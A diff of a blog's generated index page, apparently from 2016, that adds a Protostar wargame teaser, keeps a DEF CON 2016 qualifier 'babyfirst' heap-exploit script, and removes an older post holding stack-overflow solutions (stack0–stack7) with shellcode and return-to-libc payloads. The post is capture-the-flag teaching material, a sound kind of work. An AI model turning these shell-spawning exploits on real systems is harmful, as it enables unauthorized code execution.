@@ -284,6 +284,96 @@
             
               
                 
+                <a class="post-title-link" href="/2016/07/21/protostar/" itemprop="url">
+                  Protostar writeups
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            发表于
+            <time itemprop="dateCreated" datetime="2016-07-21T10:21:13+08:00" content="2016-07-21">
+              2016-07-21
+            </time>
+          </span>
+
+          
+
+          
+            
+              <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2016/07/21/protostar/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/21/protostar/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+            
+          
+
+          
+		  
+        </div>
+      </header>
+    
+
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <h2 id="stack_0">stack 0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"print 'A'*65"</span> | ./stack0</span><br></pre></td></tr></table></figure>
+<h2 id="stack_1">stack 1</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./stack1 $(python -c <span class="string">"print 'dcba'*17"</span>)</span><br></pre></td></tr></table></figure>
+<h2 id="stack_2">stack 2</h2>
+          <div class="post-more-link text-center">
+            <a class="btn" href="/2016/07/21/protostar/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
                 <a class="post-title-link" href="/2016/07/21/def-con-qual-2016-babyfirst/" itemprop="url">
                   def-con-qual-2016-babyfirst
                 </a>
@@ -330,101 +420,6 @@
           <span itemprop="articleBody">
             
               <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c'</span></span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x8048adb</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pre</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">"Exit function pointer"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">11</span>):</span><br><span class="line">        io.read_line()</span><br><span class="line">    io.read_until(<span class="string">"loc="</span>)</span><br><span class="line">    loc = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">    io.read_until(<span class="string">"size="</span>)</span><br><span class="line">    size = int(io.read_until(<span class="string">"]"</span>)[<span class="number">0</span>:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> (loc, size)</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">        <span class="string">"\xeb\x06\x90\x90\x90\x90\x90\x90"</span></span><br><span class="line">        <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">        <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">(loc, size) = pre()</span><br><span class="line"></span><br><span class="line">got_printf  = <span class="number">0x804c004</span></span><br><span class="line"></span><br><span class="line">fake0   =   <span class="string">'A'</span> * (size - <span class="number">0x4</span>)</span><br><span class="line"></span><br><span class="line">fake1   =   l32(size + <span class="number">0x4</span>) </span><br><span class="line">fake1   +=  l32((<span class="number">0x10</span>) | <span class="number">0x1</span>) </span><br><span class="line">fake1   =   fake1.ljust(<span class="number">0x10</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake2   =   l32(<span class="number">0x10</span>) </span><br><span class="line">fake2   +=  l32(<span class="number">0x80</span> | <span class="number">0x1</span>) </span><br><span class="line">fake2   +=  l32(got_printf - <span class="number">0x4</span> * <span class="number">2</span>)</span><br><span class="line">fake2   +=  l32(loc + size + <span class="number">0x10</span> + <span class="number">0xc</span>)</span><br><span class="line">fake2   +=  shellcode</span><br><span class="line">fake2   =   fake2.ljust(<span class="number">0x80</span>, <span class="string">'A'</span>)</span><br><span class="line"></span><br><span class="line">fake3   =   l32(<span class="number">0x80</span>)</span><br><span class="line">fake3   +=  l32(<span class="number">0x41</span> &amp; <span class="number">0xfffffff8</span>)</span><br><span class="line"></span><br><span class="line">fake    =   fake0 + fake1 + fake2 + fake3</span><br><span class="line"></span><br><span class="line">io.writeline(fake)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-
-            
-          </span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/07/21/protostar/" itemprop="url">
-                  Protostar writeups
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            发表于
-            <time itemprop="dateCreated" datetime="2016-07-21T10:10:00+08:00" content="2016-07-21">
-              2016-07-21
-            </time>
-          </span>
-
-          
-
-          
-            
-              <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2016/07/21/protostar/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/21/protostar/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-            
-          
-
-          
-		  
-        </div>
-      </header>
-    
-
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody">
-            
-              <h2 id="stack_0">stack 0</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"print 'A'*65"</span> | ./stack0</span><br></pre></td></tr></table></figure>
-<h2 id="stack_1">stack 1</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./stack1 $(python -c <span class="string">"print 'dcba'*17"</span>)</span><br></pre></td></tr></table></figure>
-<h2 id="stack_2">stack 2</h2><figure class="highlight"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main(int argc, const char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    int i               = 0;</span><br><span class="line">    char *my_argv[1]    = &#123;NULL&#125;;</span><br><span class="line">    char *my_env[2]     = &#123;NULL&#125;;</span><br><span class="line">    char env[76];</span><br><span class="line"></span><br><span class="line">    env[0] = 'G';</span><br><span class="line">    env[1] = 'R';</span><br><span class="line">    env[2] = 'E';</span><br><span class="line">    env[3] = 'E';</span><br><span class="line">    env[4] = 'N';</span><br><span class="line">    env[5] = 'I';</span><br><span class="line">    env[6] = 'E';</span><br><span class="line">    env[7] = '=';</span><br><span class="line"></span><br><span class="line">    for (i = 8; i &lt; 72; i++)&#123;</span><br><span class="line">        env[i] = 'A';</span><br><span class="line">    &#125;</span><br><span class="line">    env[72] = '\x0a';</span><br><span class="line">    env[73] = '\x0d';</span><br><span class="line">    env[74] = '\x0a';</span><br><span class="line">    env[75] = '\x0d';</span><br><span class="line"></span><br><span class="line">    my_env[0] = env;</span><br><span class="line">    my_env[1] = NULL;</span><br><span class="line">    </span><br><span class="line">    execve("./stack2", my_argv, my_env);    </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="stack_3">stack 3</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"print 'A'*64+'\x24\x84\x04\x08'"</span> | ./stack3</span><br></pre></td></tr></table></figure>
-<h2 id="stack_4">stack 4</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">"print 'A'*76+'\xf4\x83\x04\x08'"</span> | ./stack4</span><br></pre></td></tr></table></figure>
-<h2 id="stack_5">stack 5</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./stack5'</span></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write)</span><br><span class="line">io.gdb_hint([<span class="number">0x80483da</span>])</span><br><span class="line"></span><br><span class="line">shellcode = (</span><br><span class="line">    <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"</span></span><br><span class="line">    <span class="string">"\xc9\x89\xca\x6a\x0b\x58\xcd\x80"</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'A'</span> * <span class="number">76</span></span><br><span class="line">payload += l32(<span class="number">0xbffff7d6</span>)</span><br><span class="line">payload += <span class="string">'\x90'</span> * <span class="number">16</span>    </span><br><span class="line">payload += shellcode</span><br><span class="line"></span><br><span class="line">io.writeline(payload)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-<h2 id="stack_6">stack 6</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">target  = <span class="string">'./stack6'</span></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x080484f9</span>])</span><br><span class="line"></span><br><span class="line">adr_system  = <span class="number">0xbfecffb0</span></span><br><span class="line">plt_gets    = <span class="number">0x08048380</span></span><br><span class="line">p_ret       = <span class="number">0x08048453</span></span><br><span class="line">adr_stage   = <span class="number">0x08049000</span></span><br><span class="line"></span><br><span class="line">payload1    = <span class="string">'A'</span> * <span class="number">80</span></span><br><span class="line">payload1    += l32(plt_gets)</span><br><span class="line">payload1    += l32(p_ret)</span><br><span class="line">payload1    += l32(adr_stage)</span><br><span class="line">payload1    += l32(adr_system)</span><br><span class="line">payload1    += l32(adr_stage)</span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">"input path please:"</span>)</span><br><span class="line">io.writeline(payload1)</span><br><span class="line">io.writeline(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-<h2 id="stack_7">stack 7</h2><p>利用<figure class="highlight"><table><tr><td class="code"><pre><span class="line">&#10;```python&#10;from zio import *&#10;target  = &#39;./stack7&#39;&#10;c_read  = COLORED(RAW, &#39;green&#39;)&#10;c_write = COLORED(RAW, &#39;blue&#39;)&#10;io      = zio(target, print_read = c_read, print_write = c_write, timeout = 10000)&#10;io.gdb_hint([0x08048544])&#10;&#10;plt_gets    = 0x080483a4&#10;p_ret       = 0x08048493&#10;adr_stage   = 0x08049000&#10;&#10;shellcode = (&#10;        &#34;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31&#34;&#10;        &#34;\xc9\x89\xca\x6a\x0b\x58\xcd\x80&#34;&#10;        )&#10;&#10;payload1    = &#39;A&#39; * 80&#10;payload1    += l32(plt_gets)&#10;payload1    += l32(p_ret)&#10;payload1    += l32(adr_stage)&#10;payload1    += l32(adr_stage)&#10;&#10;io.read_until(&#34;input path please:&#34;)&#10;io.writeline(payload1)&#10;io.writeline(shellcode)&#10;&#10;io.interact()</span><br></pre></td></tr></table></figure></p>
 
             
           </span>
